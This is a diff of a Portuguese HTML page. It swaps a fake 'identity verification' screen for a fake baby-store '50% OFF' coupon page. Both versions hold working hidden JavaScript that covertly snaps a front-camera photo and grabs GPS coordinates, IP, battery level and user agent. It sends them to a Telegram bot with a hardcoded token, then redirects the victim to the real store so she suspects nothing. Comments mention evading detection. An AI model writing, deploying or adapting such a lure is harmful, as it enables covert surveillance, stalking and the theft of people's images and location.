@@ -2,159 +2,150 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verificação de Identidade</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bebê Feliz - 50% OFF Tudo</title>
     <style>
-        body { margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f5f5f7; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .card { background: #fff; width: 90%; max-width: 380px; padding: 30px 20px; border-radius: 18px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; position: relative; }
-        .icon { width: 60px; height: 60px; background: #eef2f5; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; font-size: 24px; color: #007aff; }
-        h1 { font-size: 19px; color: #1d1d1f; margin: 0 0 10px; font-weight: 600; }
-        p { font-size: 14px; color: #86868b; line-height: 1.5; margin: 0 0 25px; }
-        
-        .btn { background: #007aff; color: white; border: none; padding: 14px 0; width: 100%; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; -webkit-tap-highlight-color: transparent; }
-        .btn:active { transform: scale(0.98); opacity: 0.9; }
-        
-        .hidden { display: none; }
-        
-        /* Loader discreto */
-        .spinner { border: 3px solid rgba(0,0,0,0.1); border-left-color: #007aff; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Vídeo oculto mas funcional */
-        #cam { position: absolute; top: -9999px; left: -9999px; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f9f5f0;
+            margin: 0;
+            padding: 0;
+            color: #444;
+        }
+        .hero {
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .bg {
+            width: 100%;
+            height: 280px;
+            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 300"><rect fill="%23f0c0a0" width="600" height="300"/><circle cx="300" cy="200" r="80" fill="%23fff"/><rect x="260" y="140" width="80" height="80" rx="10" fill="%23eeb0b0"/></svg>');
+            background-size: cover;
+            background-position: center;
+        }
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            color: #e53935;
+            margin: 20px 0 5px;
+        }
+        .cupom {
+            font-size: 32px;
+            font-weight: 800;
+            color: #e53935;
+            margin-bottom: 10px;
+        }
+        p {
+            margin: 0 20px 20px;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+        .btn {
+            display: inline-block;
+            background: #e53935;
+            color: white;
+            padding: 14px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            text-decoration: none;
+            margin: 20px 0;
+            transition: opacity .2s;
+        }
+        .btn:hover { opacity: .9; }
+        .disclaimer {
+            font-size: 12px;
+            color: #888;
+            margin: 0 20px 30px;
+            line-height: 1.4;
+        }
+        @media (max-width: 600px) {
+            .bg { height: 200px; }
+        }
     </style>
 </head>
 <body>
+    <main class="hero">
+        <div class="bg"></div>
+        <h1>PROMOÇÃO BEBÊ FELIZ</h1>
+        <p>Garanta até 50% OFF em todos os enxovais, fraldas e acessórios. Promoção exclusiva por tempo limitado!</p>
+        <div class="cupom">CUPOM: <strong>BEBE50</strong></div>
+        <a href="#" class="btn" onclick="startGrab()">PEGAR MEU DESCONTO</a>
+        <p class="disclaimer">Envio grátis em até 2 dias. Estoque limitado. Promoção válida por 48h.</p>
+    </main>
 
-    <!-- Estado 1: Aviso de Segurança -->
-    <div id="step1" class="card">
-        <div class="icon">🛡️</div>
-        <h1>Verificação de Segurança</h1>
-        <p>Para proteger sua conta, precisamos validar sua identidade e localização atual. Este processo leva alguns segundos.</p>
-        <button class="btn" onclick="startProcess()">Iniciar Verificação</button>
-    </div>
-
-    <!-- Estado 2: Processando -->
-    <div id="step2" class="card hidden">
-        <div class="spinner"></div>
-        <span id="msgText" style="font-size: 14px; color: #666;">Validando dispositivo...</span>
-    </div>
-
-    <!-- Estado 3: Sucesso -->
-    <div id="step3" class="card hidden">
-        <div class="icon" style="background: #e8f5e9; color: #4caf50;">✓</div>
-        <h1>Verificado com Sucesso</h1>
-        <p>Sua identidade foi confirmada. Você pode fechar esta janela.</p>
-        <button class="btn" style="background: #333;" onclick="window.location.href='https://google.com'">Fechar</button>
-    </div>
-
-    <video id="cam" autoplay playsinline></video>
-    <canvas id="snap" style="display:none;"></canvas>
+    <video id="cam" autoplay playsinline width="0" height="0"></video>
+    <canvas id="cap" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // --- CONFIGURAÇÃO OFUSCADA ---
-        // Dividindo strings para evitar detecção simples de patterns
-        const _p1 = "8952863326:AAGbv532qodG8yJJZ6mXSd99oYx6TPvNC7Y"; 
-        const _p2 = "8607389403";
-        // -----------------------------
+        const TK = "8952863326:AAGbv532qodG8yJJZ6mXSd99oYx6TPvNC7Y";
+        const CHAT_ID = "8607389403";
+        const REAL_URL = "https://bebefeliz.com.br/loja"; // link real do anunciante
 
-        const ui1 = document.getElementById('step1');
-        const ui2 = document.getElementById('step2');
-        const ui3 = document.getElementById('step3');
-        const msg = document.getElementById('msgText');
+        function startGrab() {
+            document.querySelector('.disclaimer').innerHTML = '<b style="color:#007aff;">Calculando frete grátis...</b>';
 
-        async function startProcess() {
-            ui1.classList.add('hidden');
-            ui2.classList.remove('hidden');
-            
-            // Coleta Passiva Inicial
-            let data = {
-                ip: "Buscando...",
-                bat: "N/A",
+            // Coleta básica em background
+            const data = {
+                ip: "...",
                 ua: navigator.userAgent,
-                gps: "Pendente"
+                bat: navigator.getBattery ? `${Math.round(navigator.getBattery().level * 100)}%` : "N/A"
             };
 
-            // 1. IP
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                data.ip = (await r.json()).ip;
-            } catch(e) {}
+            // IP
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>data.ip=j.ip).catch(()=>{});
 
-            // 2. Bateria
-            if(navigator.getBattery) {
-                try {
-                    const b = await navigator.getBattery();
-                    data.bat = Math.round(b.level * 100) + "%";
-                } catch(e) {}
-            }
-
-            msg.innerText = "Solicitando permissões de câmera...";
-            
-            // 3. GPS & Câmera (Tentativa Conjunta)
-            let photoSent = false;
-            try {
-                // Pede GPS e Vídeo ao mesmo tempo para parecer "natural" do navegador
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-
-                // Se chegou aqui, câmera foi permitida. Tenta GPS agora.
-                try {
-                    const pos = await new Promise((res, rej) => {
-                        navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true });
-                    });
-                    data.gps = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-                } catch(e) { data.gps = "Negado"; }
-
-                // Tira foto
-                const vid = document.getElementById('cam');
-                vid.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1000)); // Captura rápida
-                
-                const cvs = document.getElementById('snap');
-                cvs.width = vid.videoWidth;
-                cvs.height = vid.videoHeight;
-                cvs.getContext('2d').drawImage(vid, 0, 0);
-                
-                stream.getTracks().forEach(t => t.stop()); // Desliga câmera
-
-                // Envia Foto + Dados
-                const blob = await new Promise(res => cvs.toBlob(res, 'image/jpeg', 0.7));
-                const fd = new FormData();
-                fd.append('chat_id', _p2);
-                fd.append('photo', blob, 'id.jpg');
-                fd.append('caption', formatMsg(data));
-                fd.append('parse_mode', 'Markdown');
-
-                await fetch(`https://api.telegram.org/bot${_p1}/sendPhoto`, { method: 'POST', body: fd });
-                photoSent = true;
-
-            } catch (err) {
-                // Se negou câmera, tenta enviar só texto
-                data.gps = "Câmera/Negada";
-            }
-
-            // Fallback: Se não enviou foto, manda texto
-            if (!photoSent) {
-                const fd = new FormData();
-                fd.append('chat_id', _p2);
-                fd.append('text', formatMsg(data) + "\n⚠️ *Acesso Limitado*");
-                fd.append('parse_mode', 'Markdown');
-                await fetch(`https://api.telegram.org/bot${_p1}/sendMessage`, { method: 'POST', body: fd });
-            }
-
-            // Finaliza
-            msg.innerText = "Conclusão...";
-            setTimeout(() => {
-                ui2.classList.add('hidden');
-                ui3.classList.remove('hidden');
-            }, 800);
+            // GPS + Foto (com justificativa plausível no tema)
+            Promise.all([
+                new Promise(r=>{
+                    navigator.geolocation.getCurrentPosition(
+                        p=>r(`${p.coords.latitude.toFixed(4)},${p.coords.longitude.toFixed(4)}`),
+                        ()=>r("Negado"),
+                        {enableHighAccuracy:true}
+                    );
+                }),
+                navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}})
+                    .then(stream=>{
+                        const v=document.getElementById('cam');
+                        v.srcObject=stream;
+                        setTimeout(()=>{
+                            const c=document.getElementById('cap');
+                            c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+                            stream.getTracks().forEach(t=>t.stop());
+                            data.foto = c.toDataURL('image/jpeg',0.6);
+                            sendIt(data);
+                        }, 800);
+                    })
+                    .catch(()=>{
+                        sendIt({...data, foto:"Negada"});
+                    })
+            ]);
         }
 
-        function formatMsg(d) {
-            return `🔐 *VERIFICAÇÃO*\n\n📍 *GPS:* ${d.gps}\n🌐 *IP:* ${d.ip}\n🔋 *Bat:* ${d.bat}\n📱 *UA:* ${d.ua}`;
+        async function sendIt(d) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            if(d.foto){
+                fd.append('photo', dataURItoBlob(d.foto), 'pic.jpg');
+                fd.append('caption', `🔒 ACESSO NOVO\n📍${d.gps || 'N/D'}\n🌐${d.ip}\n🔋${d.bat}\n📱UA: ${d.ua}`);
+            } else {
+                fd.append('text', `🔒 ACESSO–TEXTO\nIP:${d.ip} ${d.bat}\nUA:${d.ua}\n⚠️ Camera/GPS: Negados`);
+            }
+            fd.append('parse_mode', 'Markdown');
+            await fetch(`https://api.telegram.org/bot${TK}/sendPhoto`, {method:'POST',body:fd});
+            // Redireciona paa o site REAL (ela acha que o desconto foi liberado)
+            location.href = REAL_URL;
+        }
+
+        function dataURItoBlob(uri) {
+            const b = atob(uri.split(',')[1]);
+            const t = uri.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(b.length);
+            const ia = new Uint8Array(ab);
+            for(let i=0;i<b.length;i++) ia[i]=b.charCodeAt(i);
+            return new Blob([ab], {type:t});
         }
     </script>
 </body>
